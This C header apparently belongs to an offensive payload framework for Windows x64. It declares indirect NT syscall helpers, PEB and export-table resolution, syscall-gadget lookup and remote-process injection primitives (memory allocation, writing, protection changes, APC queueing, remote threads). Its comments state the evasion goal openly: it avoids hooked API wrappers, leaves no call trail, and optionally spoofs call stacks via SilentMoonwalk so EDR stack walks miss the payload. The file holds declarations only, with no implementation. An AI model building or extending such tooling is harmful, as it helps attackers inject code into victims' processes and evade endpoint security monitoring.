/*
 * ntsys - indirect NT syscalls and PE/PEB utilities shared by payload
 * modules (Windows x64). Ported from core/lib/syscall (Go): the PEB is
 * walked to locate modules, SSNs are derived by ranking ntdll's Zw* exports
 * by address, and syscalls are executed through a `syscall; ret` gadget in
 * ntdll. This bypasses kernel32/kernelbase wrappers (whose high-level paths,
 * e.g. QueueUserAPC -> NtQueueApcThreadEx2, are unreliable on hardened
 * hosts) and leaves no hooked-export call trail.
 *
 * Everything is guarded by _WIN64; on other architectures the declarations
 * vanish and consumers must fall back to Win32 APIs (see NTSYS_HAVE).
 *
 * Defining NTSYS_SMW at build time additionally routes every <=8-argument
 * syscall through the vendored SilentMoonwalk desync spoofer (../smw) so an
 * EDR stack walk sees a kernelbase/kernel32/ntdll thread-root frame instead
 * of the payload's own return address. The SMW sources must be compiled and
 * linked alongside ntsys.c in that case; x64 only.
 */

#ifndef COMMON_NTSYS_H
#define COMMON_NTSYS_H

#ifdef _WIN64

#include <windows.h>

#define NTSYS_HAVE 1
#define NTSYS_SSN_INVALID 0xFFFFFFFFu

/* Resolve a module's base address by walking the PEB loader lists
 * (case-insensitive name, e.g. L"ntdll.dll"). Returns 0 if not found. */
uintptr_t ntsys_module_base(const wchar_t *module);

/* Resolve an export address by name from a module's EAT. 0 if missing. */
uintptr_t ntsys_export(uintptr_t base, const char *name);

/*
 * Resolve the SSN of an Nt* routine by ranking its Zw* twin among all Zw
 * exports sorted by address. Results are cached. Returns
 * NTSYS_SSN_INVALID on failure.
 */
unsigned int ntsys_ssn(const char *nt_name);

/* Locate a `syscall; ret` gadget in ntdll's executable sections (cached). */
uintptr_t ntsys_gadget(void);

/* 1 once the gadget has been located; 0 after a failed init (callers should
 * fall back to Win32 APIs). */
int ntsys_ready(void);

/*
 * Run the syscall for `ssn` through the gadget with up to 11 arguments
 * (4 register + 7 stack, matching the Win64 syscall convention). Returns
 * rax (NTSTATUS in the low 32 bits).
 *
 * `argc` is the number of live entries in `args` and is required to route
 * through SilentMoonwalk (see NTSYS_SMW below), whose desync stub accepts at
 * most 8 arguments; wider syscalls always use the plain gadget path.
 */
long ntsys_invoke(unsigned int ssn, uintptr_t gadget,
                  const unsigned long long *args /* [11] */, int argc);

/* Remote-process primitives built on the syscalls above. All return TRUE
 * on NT_SUCCESS. */
BOOL ntsys_alloc_rw(HANDLE proc, void **base, SIZE_T *size);
BOOL ntsys_write_mem(HANDLE proc, void *base, const void *buf, SIZE_T len);
BOOL ntsys_protect_rx(HANDLE proc, void **base, SIZE_T *size);
BOOL ntsys_queue_apc(HANDLE thread, void *routine);
BOOL ntsys_create_remote_thread(HANDLE proc, void *routine, HANDLE *out);

#endif /* _WIN64 */

#endif /* COMMON_NTSYS_H */
